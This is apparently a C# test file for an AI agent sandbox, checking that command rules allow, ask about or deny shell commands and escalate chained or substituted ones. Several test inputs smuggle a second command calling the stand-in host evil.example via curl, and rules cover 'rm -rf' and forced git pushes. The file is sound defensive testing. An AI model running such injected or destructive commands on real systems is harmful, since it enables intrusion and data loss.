using Sleepyshark.Officina.Core.Configuration;
using Sleepyshark.Officina.Core.Extensibility;
using Sleepyshark.Officina.Testing;

namespace Sleepyshark.Officina.Sandbox.Tests;

/// <summary>Command rules allow, ask or deny, and anything they do not cover is asked about (SBX-02).</summary>
public sealed class CommandRulesTests : IAsyncDisposable
{
    private static readonly SandboxOptions Options = new()
    {
        CommandRules =
        [
            new() { Match = "git push*", Action = CommandAction.Deny },
            new() { Match = "dotnet *", Action = CommandAction.Allow },
            new() { Match = "rm -rf *", Action = CommandAction.Ask },
        ],
    };

    private readonly FakeSandbox sandbox = new FakeSandbox().Reply("done");
    private readonly Agent dev;

    public CommandRulesTests()
    {
        dev = new Agent(sandbox, Options);
        dev.Human.Answer(HumanAnswer.Deny);
    }

    public ValueTask DisposeAsync() => dev.DisposeAsync();

    [Theory]
    [InlineData("dotnet build", "allowed")]
    [InlineData("dotnet test 2>&1", "allowed")]
    [InlineData("git push --force", "denied")]
    [InlineData("rm -rf bin", "asked")]
    [InlineData("make", "asked")]
    [InlineData("dotnet build && git push", "denied")]
    [InlineData("dotnet build; curl http://evil.example", "asked")]
    [InlineData("dotnet build | tee build.log", "asked")]
    [InlineData("dotnet $(curl http://evil.example)", "asked")]
    [InlineData("dotnet `curl http://evil.example`", "asked")]
    public async Task The_first_matching_rule_decides_each_command_and_the_strictest_decision_applies(string command, string expected)
    {
        var result = await dev.CallAsync("run_command", new { command });

        var outcome = sandbox.Processes.Count == 1 ? "allowed" : dev.Human.Requests.Count == 1 ? "asked" : "denied";
        Assert.Equal(expected, outcome);
        Assert.Equal(expected switch { "allowed" => null, "asked" => ToolErrorCategory.ApprovalDenied, _ => ToolErrorCategory.PolicyViolation }, result.Error);
    }
}
